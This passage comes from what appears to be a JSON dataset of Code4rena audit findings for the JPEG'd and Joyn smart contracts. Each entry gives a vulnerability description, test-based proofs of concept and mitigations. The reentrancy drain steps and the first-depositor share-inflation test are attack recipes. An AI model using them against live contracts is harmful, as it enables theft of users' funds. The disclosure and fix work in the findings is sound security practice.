      "content": "_Submitted by WatchPug_\n\n[NFTVault.sol#L844-L851](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/NFTVault.sol#L844-L851)<br>\n\n```solidity\nuint256 debtAmount = _getDebtAmount(_nftIndex);\nrequire(\n    debtAmount >= _getLiquidationLimit(_nftIndex),\n    \"position_not_liquidatable\"\n);\n\n// burn all payment\nstablecoin.burnFrom(msg.sender, debtAmount);\n```\n\nIn the current design/implementation, the liquidator must fully repay the user's outstanding debt in order to get the NFT.\n\nWhen the market value of the NFT fell rapidly, the liquidators may not be able to successfully liquidate as they can not sell the NFT for more than the debt amount.\n\nIn that case, the protocol will have positions that are considered bad debts.\n\nHowever, these loans, which may never be repaid, are still accruing interest. And every time the DAO collects interest, new `stablecoin` will be minted.\n\nWhen the proportion of bad debts is large enough since the interest generated by these bad debts is not backed. It will damage the authenticity of the stablecoin.\n\n### Proof of Concept\n\nGiven:\n\n*   `NFT 1` worth 30,000 USD\n*   `creditLimitRate` = 60%\n*   `liquidationLimitRate` = 50%\n*   `debtInterestApr` = 10%\n\n1.  Alice borrowed `10,000 USD` with `NFT #1`;\n2.  After 1 year, `NFT 1`'s market value in USD has suddenly dropped to `10,000` USD, no liquidator is willing to repay 11,000 USD for `NFT #1`;\n3.  The DAO `collect()` and minted `1,000` stablecoin;\n4.  After 1 year, the DAO call `collect()` will mint `1,100` stablecoin. and so on...\n\n### Recommended Mitigation Steps\n\nConsider adding a stored value to record the amount of bad debt, and add a public function that allows anyone to mark a bad debt to get some reward. and change `accrue` to:\n\n```solidity\nuint256 internal badDebtPortion;\n\nfunction accrue() public {\n    uint256 additionalInterest = _calculateAdditionalInterest();\n\n    totalDebtAccruedAt = block.timestamp;\n\n    totalDebtAmount += additionalInterest;\n\n    uint256 collectibleInterest = additionalInterest * (totalDebtPortion - badDebtPortion) / totalDebtPortion;\n    totalFeeCollected += collectibleInterest;\n}\n```\n\n**[spaghettieth (JPEG'd) acknowledged, but disagreed with High severity](https://github.com/code-423n4/2022-04-jpegd-findings/issues/167)**\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/167#issuecomment-1109933407):**\n > I agree with the warden. Left unchecked, this issue is almost certain to occur and will cause substantial negative impacts on the protocol. The only way this would not occur is if the NFT market never crashes.\n\n\n\n***\n \n",
      "summary": "\nThis bug report concerns a vulnerability in the NFTVault contract of the 2022-04-jpegd code repository. The vulnerability involves the liquidation process of a user's outstanding debt. Currently, the liquidator must fully repay the user's debt in order to get the NFT. This can become a problem when the market value of the NFT falls rapidly, as the liquidator may not be able to sell the NFT for more than the debt amount. This will result in bad debt positions that are not backed and will damage the authenticity of the stablecoin. \n\nTo demonstrate the vulnerability, a PoC was provided. It involved an NFT worth 30,000 USD, a credit limit rate of 60%, a liquidation limit rate of 50%, and a debt interest APR of 10%. An example was given of Alice borrowing 10,000 USD with NFT #1, and after one year, the NFT's market value in USD suddenly dropped to 10,000 USD. In this case, no liquidator is willing to repay 11,000 USD for NFT #1, and every time the DAO collects interest, new stablecoin will be minted.\n\nThe recommendation given was to consider adding a stored value to record the amount of bad debt, and add a public function that allows anyone to mark a bad debt to get some reward. The accrue function should also be changed to calculate the collectible interest based on the total debt portion minus the bad debt portion.\n\nIn conclusion, this bug report details a vulnerability in the NFTVault contract of the 2022-04-jpegd code repository. The vulnerability involves the liquidation process of a user's outstanding debt, which can result in bad debt positions that are not backed and will damage the authenticity of the stablecoin. A PoC and recommendation were provided to help mitigate the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/167",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1914",
      "title": "[H-08] StrategyPUSDConvex.balanceOfJPEG uses incorrect function signature while calling extraReward.earned, causing the function to unexpectedly revert everytime",
      "impact": "HIGH",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L234\n\n\n## Vulnerability details\n\n## Impact\n\nAs specified in Convex [BaseRewardPool.sol](https://github.com/convex-eth/platform/blob/main/contracts/contracts/BaseRewardPool.sol#L149) and [VirtualRewardPool.sol](https://github.com/convex-eth/platform/blob/main/contracts/contracts/VirtualBalanceRewardPool.sol#L127), the function signature of `earned` is `earned(address)`. However, `balanceOfJPEG` did not pass any arguments to `earned`, which would cause `balanceOfJPEG` to always revert.\n\nThis bug will propagate through `Controller` and `YVault` until finally reaching the source of the call in `YVaultLPFarming ._computeUpdate`, and render the entire farming contract unuseable.\n\n## Proof of Concept\n\nBoth `BaseRewardPool.earned` and `VirtualBalanceRewardPool.earned` takes an address as argument\n\n```\n    function earned(address account) public view returns (uint256) {\n        return\n            balanceOf(account)\n                .mul(rewardPerToken().sub(userRewardPerTokenPaid[account]))\n                .div(1e18)\n                .add(rewards[account]);\n    }\n\n    function earned(address account) public view returns (uint256) {\n        return\n            balanceOf(account)\n                .mul(rewardPerToken().sub(userRewardPerTokenPaid[account]))\n                .div(1e18)\n                .add(rewards[account]);\n    }\n```\n\nBut `balanceOfJPEG` does not pass any address to `extraReward.earned`, causing the entire function to revert when called\n```\n    function balanceOfJPEG() external view returns (uint256) {\n        uint256 availableBalance = jpeg.balanceOf(address(this));\n\n        IBaseRewardPool baseRewardPool = convexConfig.baseRewardPool;\n        uint256 length = baseRewardPool.extraRewardsLength();\n        for (uint256 i = 0; i < length; i++) {\n            IBaseRewardPool extraReward = IBaseRewardPool(baseRewardPool.extraRewards(i));\n            if (address(jpeg) == extraReward.rewardToken()) {\n                availableBalance += extraReward.earned();\n                //we found jpeg, no need to continue the loop\n                break;\n            }\n        }\n\n        return availableBalance;\n    }\n```\n\n## Tools Used\n\nvim, ganache-cli\n\n## Recommended Mitigation Steps\n\nPass `address(this)` as argument of `earned`.\n\nNotice how we modify the fetching of reward. This is reported in a separate bug report, but for completeness, the entire fix is shown in both report entries.\n\n```\n    function balanceOfJPEG() external view returns (uint256) {\n        uint256 availableBalance = jpeg.balanceOf(address(this));\n\n        IBaseRewardPool baseRewardPool = convexConfig.baseRewardPool;\n        availableBalance += baseRewardPool.earned(address(this));\n        uint256 length = baseRewardPool.extraRewardsLength();\n        for (uint256 i = 0; i < length; i++) {\n            IBaseRewardPool extraReward = IBaseRewardPool(baseRewardPool.extraRewards(i));\n            if (address(jpeg) == extraReward.rewardToken()) {\n                availableBalance += extraReward.earned(address(this));\n            }\n        }\n\n        return availableBalance;\n    }\n```",
      "summary": "\nThis bug report is about a vulnerability in the code of a contract called â€œStrategyPUSDConvexâ€. It is located at https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L234. The bug is caused by a function called â€œbalanceOfJPEGâ€ not passing any arguments to the function â€œearnedâ€, which is specified in two other contracts, â€œBaseRewardPoolâ€ and â€œVirtualRewardPoolâ€. This would cause the entire farming contract to be unusable. The tools used to identify this bug were Vim and Ganache-cli. The recommended mitigation step is to pass â€œaddress(this)â€ as an argument of â€œearnedâ€. This fix is shown in the report.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/139",
      "tags": [],
      "finders": [
        "rayn"
      ]
    },
    {
      "id": "1913",
      "title": "[H-07] Controller: Strategy migration will fail",
      "impact": "HIGH",
      "content": "_Submitted by hickuphh3, also found by rayn_\n\n[Controller.sol#L95](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/Controller.sol#L95)<br>\n[StrategyPUSDConvex.sol#L266](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/strategies/StrategyPUSDConvex.sol#L266)<br>\n\nThe controller calls the `withdraw()` method to withdraw JPEGs from the contract, but the strategy might blacklist the JPEG asset, which is what the PUSDConvex strategy has done.\n\nThe migration would therefore revert.\n\n### Proof of Concept\n\nInsert this test into [`StrategyPUSDConvex.ts`](https://github.com/code-423n4/2022-04-jpegd/blob/main/tests/StrategyPUSDConvex.ts).\n\n```jsx\nit.only(\"will revert when attempting to migrate strategy\", async () => {\n  await controller.setVault(want.address, yVault.address);\n  await expect(controller.setStrategy(want.address, strategy.address)).to.be.revertedWith(\"jpeg\");\n});\n```\n\n### Recommended Mitigation Steps\n\nReplace `_current.withdraw(address(jpeg));` with `_current.withdrawJPEG(vaults[_token])`.\n\n**[spaghettieth (JPEG'd) confirmed and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/57#issuecomment-1096633358):**\n > The proposed migration steps would modify the intended behaviour, which is to withdraw JPEG to the controller and not the vault. A correct solution would be replacing `_current.withdraw(address(jpeg))` with `_current.withdrawJPEG(address(this))`.\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/57#issuecomment-1099242526):**\n > Fixed in [jpegd/core#6](https://github.com/jpegd/core/pull/6).\n\n\n\n***\n\n",
      "summary": "\nThis bug report concerns a vulnerability in the contracts of the code-423n4/2022-04-jpegd repository. Specifically, the controller calls the `withdraw()` method to withdraw JPEGs from the contract, but the strategy might blacklist the JPEG asset, which is what the PUSDConvex strategy has done. This would cause the migration to revert. In order to prove the concept, the tester inserted a test into the StrategyPUSDConvex.ts file, which demonstrated the issue. The recommended mitigation step is to replace `_current.withdraw(address(jpeg));` with `_current.withdrawJPEG(vaults[_token])`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/57",
      "tags": [],
      "finders": [
        "rayn",
        "hickuphh3"
      ]
    },
    {
      "id": "1912",
      "title": "[H-06] Setting new controller can break YVaultLPFarming",
      "impact": "HIGH",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L170\nhttps://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L108\n\n\n## Vulnerability details\n\n## Impact\nThe accruals in `yVaultLPFarming` will fail if [`currentBalance < previousBalance`](https://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/farming/yVaultLPFarming.sol#L170) in `_computeUpdate`.\n\n```solidity\ncurrentBalance = vault.balanceOfJPEG() + jpeg.balanceOf(address(this));\nuint256 newRewards = currentBalance - previousBalance;\n```\n\nNo funds can be withdrawn anymore as the `withdraw` functions first trigger an `_update`.\n\nThe `currentBalance < previousBalance` case can, for example, be triggerd by decreasing the `vault.balanceOfJPEG()` due to calling `yVault.setController`:\n\n```solidity\nfunction setController(address _controller) public onlyOwner {\n    // @audit can reduce balanceofJpeg which breaks other masterchef contract\n    require(_controller != address(0), \"INVALID_CONTROLLER\");\n    controller = IController(_controller);\n}\n\nfunction balanceOfJPEG() external view returns (uint256) {\n    // @audit new controller could return a smaller balance\n    return controller.balanceOfJPEG(address(token));\n}\n```\n\n## Recommended Mitigation Steps\nSetting a new controller on a vault must be done very carefully and requires a migration.",
      "summary": "\nThis bug report is about a vulnerability in the yVaultLPFarming contract, which is part of the code-423n4/2022-04-jpegd project. This vulnerability can cause the accruals in yVaultLPFarming to fail if the currentBalance is lower than the previousBalance in the _computeUpdate function. This can be triggered by decreasing the vault.balanceOfJPEG() when setting a new controller on a vault. This means that no funds can be withdrawn anymore.\n\nIn order to mitigate this vulnerability, it is recommended to set a new controller on a vault very carefully, and to do so with a migration.",
      "quality_score": 3,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/80",
      "tags": [
        "Overflow/Underflow",
        "Admin"
      ],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "1911",
      "title": "[H-05] yVaultLPFarming: No guarantee JPEG currentBalance > previousBalance",
      "impact": "HIGH",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/farming/yVaultLPFarming.sol#L169-L170\n\n\n## Vulnerability details\n\n## Details & Impact\n\nyVault users participating in the farm have to trust that:\n\n- `vault.balanceOfJPEG()`  returns the correct claimable JPEG amount by its strategy / strategies\n- the strategy / strategies will send all claimable JPEG to the farm\n\nShould either of these assumptions break, then it could be possibly be the case that `currentBalance` is less than `previousBalance`, causing deposits and crucially, withdrawals to fail due to subtraction overflow.\n\n## Proof of Concept\n\nFor instance, \n\n- Farm migration occurs. A new farm is set in `yVault`, then `withdrawJPEG()` is called, which sends funds to the new farm. Users of the old farm would be unable to withdraw their deposits.\n\n```jsx\nit.only(\"will revert old farms' deposits and withdrawals if yVault migrates farm\", async () => {\n  // 0. setup\n  await token.mint(owner.address, units(1000));\n  await token.approve(yVault.address, units(1000));\n  await yVault.depositAll();\n  await yVault.approve(lpFarming.address, units(1000));\n  // send some JPEG to strategy prior to deposit\n  await jpeg.mint(strategy.address, units(100));\n  // deposit twice, so that the second deposit will invoke _update()\n  await lpFarming.deposit(units(250));\n  await lpFarming.deposit(units(250));\n\t\n  // 1. change farm and call withdrawJPEG()\n  await yVault.setFarmingPool(user1.address);\n  await yVault.withdrawJPEG();\n\t\n  // deposit and withdrawal will fail\n  await expect(lpFarming.deposit(units(500))).to.be.revertedWith('reverted with panic code 0x11 (Arithmetic operation underflowed or overflowed outside of an unchecked block)');\n  await expect(lpFarming.withdraw(units(500))).to.be.revertedWith('reverted with panic code 0x11 (Arithmetic operation underflowed or overflowed outside of an unchecked block)');\n});\n```\n\n- Strategy migration occurs, but JPEG funds held by the old strategy were not claimed, causing `vault.balanceOfJPEG()` to report a smaller amount than previously recorded\n- `jpeg` could be accidentally included in the StrategyConfig, resulting in JPEG being converted to other assets\n- A future implementation takes a fee on the `jpeg` to be claimed\n\n## Recommended Mitigation Steps\n\nA simple fix would be to `return` if `currentBalance â‰¤ previousBalance`. A full fix would properly handle potential shortfall.\n\n```jsx\nif (currentBalance <= previousBalance) return;\n```",
      "summary": "\nThis bug report is about a vulnerability that affects users of the yVault platform. It is possible that the balance of JPEG tokens returned by the platform's strategy/strategies is incorrect, which could cause deposits and withdrawals to fail due to subtraction overflow. A proof of concept is provided that demonstrates how this could happen if a farm migration or strategy migration occurs. It is also possible that JPEG tokens could be accidentally included in the StrategyConfig or a fee could be taken on the JPEG tokens to be claimed in the future. The recommended mitigation step is to add a line of code that returns if the current balance is less than the previous balance.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/56",
      "tags": [],
      "finders": [
        "hickuphh3"
      ]
    },
    {
      "id": "1910",
      "title": "[H-04] Reentrancy issue in yVault.deposit",
      "impact": "HIGH",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-04-jpegd/blob/e72861a9ccb707ced9015166fbded5c97c6991b6/contracts/vaults/yVault/yVault.sol#L144-L145\n\n\n## Vulnerability details\n\n## Impact\nIn `deposit`, the balance is cached and then a `token.transferFrom` is triggered which can lead to exploits if the `token` is a token that gives control to the sender, like ERC777 tokens.\n\n#### POC\nInitial state: `balance() = 1000`, shares `supply = 1000`.\nDepositing 1000 amount should mint 1000 supply, but one can split the 1000 amounts into two 500 deposits and use re-entrancy to profit.\n\n- Outer `deposit(500)`: `balanceBefore = 1000`. Control is given to attacker ...\n- Inner `deposit(500)`: `balanceBefore = 1000`. `shares = (_amount * supply) / balanceBefore = 500 * 1000 / 1000 = 500` shares are minted ...\n- Outer `deposit(500)` continues with the mint: `shares = (_amount * supply) / balanceBefore = 500 * 1500 / 1000 = 750` are minted.\n- Withdrawing the `500 + 750 = 1250` shares via `withdraw(1250)`, the attacker receives `backingTokens = (balance() * _shares) / supply = 2000 * 1250 / 2250 = 1111.111111111`. The attacker makes a profit of `1111 - 1000 = 111` tokens.\n- They repeat the attack until the vault is drained.\n\n## Recommended Mitigation Steps\nThe `safeTransferFrom` should be the last call in `deposit`.",
      "summary": "\nThis bug report is about an exploit in the yVault contract. When the deposit function is triggered, the balance is cached and then a token.transferFrom is triggered which can lead to exploits if the token is a token that gives control to the sender, like ERC777 tokens. An example of this exploit is if the balance is 1000 and 1000 is deposited, the attacker can split the 1000 into two 500 deposits and use re-entrancy to profit. This would allow them to withdraw 1250 shares and receive 1111.111111111 tokens, which is a profit of 111 tokens. To mitigate this exploit, it is recommended that the safeTransferFrom should be the last call in the deposit function.",
      "quality_score": 4,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/81",
      "tags": [
        "Reentrancy"
      ],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "1909",
      "title": "[H-03] Update initializer modifier to prevent reentrancy during initialization",
      "impact": "HIGH",
      "content": "_Submitted by Dravee_\n\n[package.json#L18-L19](https://github.com/code-423n4/2022-04-jpegd/blob/main/package.json#L18-L19)<br>\n\nThe solution uses:\n\n```jsx\n    \"@openzeppelin/contracts\": \"^4.0.0\",\n    \"@openzeppelin/contracts-upgradeable\": \"^4.3.2\",\n```\n\nThese dependencies have a known high severity vulnerability:\n\n*   <https://security.snyk.io/vuln/SNYK-JS-OPENZEPPELINCONTRACTSUPGRADEABLE-2320177>\n*   <https://snyk.io/test/npm/@openzeppelin/contracts-upgradeable/4.3.2#SNYK-JS-OPENZEPPELINCONTRACTSUPGRADEABLE-2320177>\n*   <https://snyk.io/test/npm/@openzeppelin/contracts/4.0.0#SNYK-JS-OPENZEPPELINCONTRACTS-2320176>\n\nWhich makes these contracts vulnerable:\n\n```jsx\ncontracts/helpers/CryptoPunksHelper.sol:\n  19:     function initialize(address punksAddress) external initializer {\n\ncontracts/helpers/EtherRocksHelper.sol:\n  19:     function initialize(address rocksAddress) external initializer {\n\ncontracts/staking/JPEGStaking.sol:\n  21:     function initialize(IERC20Upgradeable _jpeg) external initializer {\n\ncontracts/vaults/FungibleAssetVaultForDAO.sol:\n  71:     ) external initializer {\n\ncontracts/vaults/NFTVault.sol:\n  149:     ) external initializer {\n```\n\n### Recommended Mitigation Steps\n\nUpgrade `@openzeppelin/contracts` and `@openzeppelin/contracts-upgradeable` to version 4.4.1 or higher.\n\n**[spaghettieth (JPEG'd) confirmed, but disagreed with High severity](https://github.com/code-423n4/2022-04-jpegd-findings/issues/227)**\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/227#issuecomment-1099246138):**\n > Fixed in [jpegd/core#11](https://github.com/jpegd/core/pull/11).\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the solution which uses the dependencies \"@openzeppelin/contracts\" and \"@openzeppelin/contracts-upgradeable\" in version 4.0.0 and 4.3.2 respectively. This vulnerability is of high severity and can affect the contracts CryptoPunksHelper.sol, EtherRocksHelper.sol, JPEGStaking.sol, FungibleAssetVaultForDAO.sol, and NFTVault.sol. \n\nThe recommended mitigation step is to upgrade the dependencies to version 4.4.1 or higher. This will ensure that the contracts are no longer vulnerable to the high severity bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/227",
      "tags": [],
      "finders": [
        "Dravee"
      ]
    },
    {
      "id": "1908",
      "title": "[H-02] Existing userâ€™s locked JPEG could be overwritten by new user, causing permanent loss of JPEG funds",
      "impact": "HIGH",
      "content": "_Submitted by hickuphh3, also found by 0x1f8b, AuditsAreUS, Foundation, Kthere, Meta0xNull, rayn, and WatchPug_\n\n[NFTVault.sol#L375](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/NFTVault.sol#L375)<br>\n[JPEGLock.sol#L54-L62](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/lock/JPEGLock.sol#L54-L62)<br>\n\nA userâ€™s JPEG lock schedule can be overwritten by another userâ€™s if he (the other user) submits and finalizes a proposal to change the same NFT indexâ€™s value.\n\nThe existing user will be unable to withdraw his locked JPEGs, resulting in permanent lock up of JPEG in the locker contract.\n\n### Proof of Concept\n\n1.  `user` successfully proposes and finalizes a proposal to change his NFTâ€™s collateral value\n2.  Another user (`owner`) does the same for the same NFT index\n3.  `user` will be unable to withdraw his locked JPEG because schedule has been overwritten\n\nInsert this test case into [`NFTVault.ts`](https://github.com/code-423n4/2022-04-jpegd/blob/main/tests/NFTVault.ts).\n\n```jsx\nit.only(\"will overwrite existing user's JPEG lock schedule\", async () => {\n  // 0. setup\n  const index = 7000;\n  await erc721.mint(user.address, index);\n  await nftVault\n    .connect(dao)\n    .setPendingNFTValueETH(index, units(50));\n  await jpeg.transfer(user.address, units(150000));\n  await jpeg.connect(user).approve(locker.address, units(500000));\n  await jpeg.connect(owner).approve(locker.address, units(500000));\n\n  // 1. user has JPEG locked for finalization\n  await nftVault.connect(user).finalizePendingNFTValueETH(index);\n\n  // 2. owner submit proposal to further increase NFT value\n  await nftVault\n    .connect(dao)\n    .setPendingNFTValueETH(index, units(100));\n  \n  // 3. owner finalizes, has JPEG locked\n  await nftVault.connect(owner).finalizePendingNFTValueETH(index);\n\n  // user schedule has been overwritten\n  let schedule = await locker.positions(index);\n  expect(schedule.owner).to.equal(owner.address);\n\n  // user tries to unstake\n  // wont be able to because schedule was overwritten\n  await timeTravel(days(366));\n  await expect(locker.connect(user).unlock(index)).to.be.revertedWith(\"unauthorized\");\n});\n```\n\n### Recommended Mitigation Steps\n\n1.  Release the tokens of the existing schedule. Simple and elegant.\n\n```jsx\n// in JPEGLock#lockFor()\nLockPosition memory existingPosition = positions[_nftIndex];\nif (existingPosition.owner != address(0)) {\n  // release jpegs to existing owner\n  jpeg.safeTransfer(existingPosition.owner, existingPosition.lockAmount);\n}\n```\n\n2.  Revert in `finalizePendingNFTValueETH()` there is an existing lock schedule. This is less desirable IMO, as there is a use-case for increasing / decreasing the NFT value.\n\n**[spaghettieth (JPEG'd) confirmed](https://github.com/code-423n4/2022-04-jpegd-findings/issues/10)**\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/10#issuecomment-1099232121):**\n > Fixed in [jpegd/core#3](https://github.com/jpegd/core/pull/3).\n\n\n\n***\n\n",
      "summary": "\nThis bug report describes a vulnerability in the JPEGLock and NFTVault contracts which can cause a user's JPEG lock schedule to be overwritten by another user if the other user submits and finalizes a proposal to change the same NFT index's value. The existing user will be unable to withdraw their locked JPEGs, resulting in a permanent lock up of JPEGs in the locker contract. The bug report includes a proof of concept to demonstrate the vulnerability.\n\nTwo mitigation steps are recommended in the bug report. The first mitigation step is to release the tokens of the existing schedule. This can be achieved by adding a simple code snippet in the JPEGLock#lockFor() function. The second mitigation step is to revert in the finalizePendingNFTValueETH() function if there is an existing lock schedule. This is less desirable, as there is a use case for increasing or decreasing the NFT value.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/10",
      "tags": [],
      "finders": [
        "hickuphh3",
        "Meta0xNull",
        "WatchPug",
        "rayn",
        "AuditsAreUS",
        "Foundation",
        "0x1f8b",
        "Kthere"
      ]
    },
    {
      "id": "1907",
      "title": "[H-01] yVault: First depositor can break minting of shares",
      "impact": "HIGH",
      "content": "_Submitted by hickuphh3, also found by 0xDjango, berndartmueller, cmichel, hyh, and WatchPug_\n\n[yVault.sol#L148-L153](https://github.com/code-423n4/2022-04-jpegd/blob/main/contracts/vaults/yVault/yVault.sol#L148-L153)<br>\n\nThe attack vector and impact is the same as [TOB-YEARN-003](https://github.com/yearn/yearn-security/blob/master/audits/20210719\\_ToB_yearn_vaultsv2/ToB\\_-\\_Yearn_Vault_v\\_2\\_Smart_Contracts_Audit_Report.pdf), where users may not receive shares in exchange for their deposits if the total asset amount has been manipulated through a large â€œdonationâ€.\n\n### Proof of Concept\n\n*   Attacker deposits 1 wei to mint 1 share\n*   Attacker transfers exorbitant amount to the `StrategyPUSDConvex` contract to greatly inflate the shareâ€™s price. Note that the strategy deposits its entire balance into Convex when its `deposit()` function is called.\n*   Subsequent depositors instead have to deposit an equivalent sum to avoid minting 0 shares. Otherwise, their deposits accrue to the attacker who holds the only share.\n\nInsert this test into [`yVault.ts`](https://github.com/code-423n4/2022-04-jpegd/blob/main/tests/yVault.ts).\n\n```jsx\nit.only(\"will cause 0 share issuance\", async () => {\n  // mint 10k + 1 wei tokens to user1\n  // mint 10k tokens to owner\n  let depositAmount = units(10_000);\n  await token.mint(user1.address, depositAmount.add(1));\n  await token.mint(owner.address, depositAmount);\n  // token approval to yVault\n  await token.connect(user1).approve(yVault.address, 1);\n  await token.connect(owner).approve(yVault.address, depositAmount);\n  \n  // 1. user1 mints 1 wei = 1 share\n  await yVault.connect(user1).deposit(1);\n  \n  // 2. do huge transfer of 10k to strategy\n  // to greatly inflate share price (1 share = 10k + 1 wei)\n  await token.connect(user1).transfer(strategy.address, depositAmount);\n  \n  // 3. owner deposits 10k\n  await yVault.connect(owner).deposit(depositAmount);\n  // receives 0 shares in return\n  expect(await yVault.balanceOf(owner.address)).to.equal(0);\n\n  // user1 withdraws both his and owner's deposits\n  // total amt: 20k + 1 wei\n  await expect(() => yVault.connect(user1).withdrawAll())\n    .to.changeTokenBalance(token, user1, depositAmount.mul(2).add(1));\n});\n```\n\n### Recommended Mitigation Steps\n\n*   [Uniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L119-L124). The same can be done in this case i.e. when `totalSupply() == 0`, send the first min liquidity LP tokens to the zero address to enable share dilution.\n*   Ensure the number of shares to be minted is non-zero: `require(_shares != 0, \"zero shares minted\");`\n\n**[spaghettieth (JPEG'd) confirmed, but disagreed with High severity](https://github.com/code-423n4/2022-04-jpegd-findings/issues/12)**\n\n**[spaghettieth (JPEG'd) resolved and commented](https://github.com/code-423n4/2022-04-jpegd-findings/issues/12#issuecomment-1099249025):**\n > Fixed in [jpegd/core#16](https://github.com/jpegd/core/pull/16).\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the yVault contract, which is part of the 2022-04-jpegd repository on Github. The vulnerability is similar to TOB-YEARN-003, where users may not receive shares in exchange for their deposits if the total asset amount has been manipulated through a large â€œdonationâ€. To demonstrate the vulnerability, the report provides a proof of concept which involves an attacker depositing 1 wei to mint 1 share, transferring an exorbitant amount to the StrategyPUSDConvex contract to inflate the shareâ€™s price, and then having subsequent depositors deposit an equivalent sum to avoid minting 0 shares. This will allow the attacker to accrue all of the deposits. \n\nThe report then provides two recommended mitigation steps to solve this problem. The first is to send the first 1000 LP tokens to the zero address, as was done in the Uniswap V2 contract. The second is to ensure that the number of shares to be minted is non-zero. Both of these steps should be implemented to prevent this vulnerability from occurring.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "https://github.com/code-423n4/2022-04-jpegd-findings/issues/12",
      "tags": [
        "First Depositor Issue"
      ],
      "finders": [
        "cmichel",
        "hickuphh3",
        "0xDjango",
        "WatchPug",
        "berndartmueller",
        "hyh"
      ]
    },
    {
      "id": "5287",
      "title": "[G-19] `public` functions not called by the contract should be declared `external` instead",
      "impact": "GAS",
      "content": "\nContracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents' functions and change the visibility from `external` to `public`.\n\n1.  File: royalty-vault/contracts/RoyaltyVault.sol (lines [95-100](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/royalty-vault/contracts/RoyaltyVault.sol#L95-L100))\n\n```solidity\n    function supportsInterface(bytes4 interfaceId)\n        public\n        view\n        virtual\n        override(IRoyaltyVault, ERC165)\n        returns (bool)\n```\n\n2.  File: royalty-vault/contracts/RoyaltyVault.sol (line [88](https://github.com/code-423n4/2022-03-joyn/blob/c9297ccd925ebb2c44dbc6eaa3effd8db5d2368a/royalty-vault/contracts/RoyaltyVault.sol#L88))\n\n```solidity\n    function getSplitter() public view override returns (address) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Joyn",
      "source_link": "https://code4rena.com/reports/2022-03-joyn",
      "github_link": "#g-19-public-functions-not-called-by-the-contract-should-be-declared-external-instead",
      "tags": [],
      "finders": []
    },
    {
      "id": "5286",
      "title": "[G-18] `private` functions not called by the contract should be removed to save deployment gas",
      "impact": "GAS",
